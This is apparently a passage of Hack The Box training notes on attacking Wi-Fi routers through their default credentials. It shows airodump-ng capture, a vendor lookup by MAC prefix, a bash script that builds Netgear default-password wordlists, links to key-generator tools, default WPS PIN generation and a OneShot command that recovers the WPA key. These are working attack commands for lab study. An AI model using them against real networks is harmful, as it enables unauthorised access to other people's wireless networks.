### Performing Vendor Lookup

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 --essid HackTheBox-Wifi
```

```sh
3kjS@htb[/htb]$ grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt

9C-C9-EB   (hex)                NETGEAR
```
#### Netgear Default Password Patterns

```sh
3kjS@htb[/htb]$ git clone https://github.com/LivingInSyn/netgear_hashcat_wordlist.git
3kjS@htb[/htb]$ cd netgear_hashcat_wordlist/wordlists
```

```sh
#!/bin/bash

# Wordlists
wordlist1="adjectives.txt"
wordlist2="nouns.txt"
wordlist3="numbers.txt"

output="Netgear_Default.txt"

# Clear the output file if it exists
> "$output"

# adjective + noun + number
while IFS= read -r adj; do
  while IFS= read -r noun; do
    while IFS= read -r num; do
      echo "${adj}${noun}${num}" >> "$output"
    done < "$wordlist3"
  done < "$wordlist2"
done < "$wordlist1"
```

```sh
3kjS@htb[/htb]$ python3 NPCinator.py > passwords.txt
```

|**Link**|**Description**|
|---|---|
|[Smart Password Generator](https://github.com/ahmdrz/wifi-password-generator)|Generates wordlist based on salt, MAC and BSSID of the target|
|[IMEI Password Generator](https://github.com/RealEnder/imeigen)|WPA-PSK default password candidates generator for mobile broadband WIFI routers, based on `IMEI`|
|[Time Warner/Spectrum Routers Cracker](https://github.com/datagoboom/twcracker)|Default Password Generator for `Time Warner` / `Spectrum` Routers|
|[Wifi-WPA-Keyspace-List](https://github.com/sheimo/Wifi-WPA-Keyspace-List)|A list of various routers default WPA key space|
### Default WPS Pin

```sh
3kjS@htb[/htb]$ wpspin D4:BF:7F:EB:29:D2
```

WPSPin can also generate a variety of potential WPS PINs for valid BSSIDs when the `-A` flag is used.

```sh
3kjS@htb[/htb]$ wpspin -A D4:BF:7F:EB:29:D2
```

Once a valid PIN is identified, tools such as `Reaver` or `OneShot` can be used to recover the corresponding WPA-PSK.

```sh
3kjS@htb[/htb]$ python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p 99956042
```
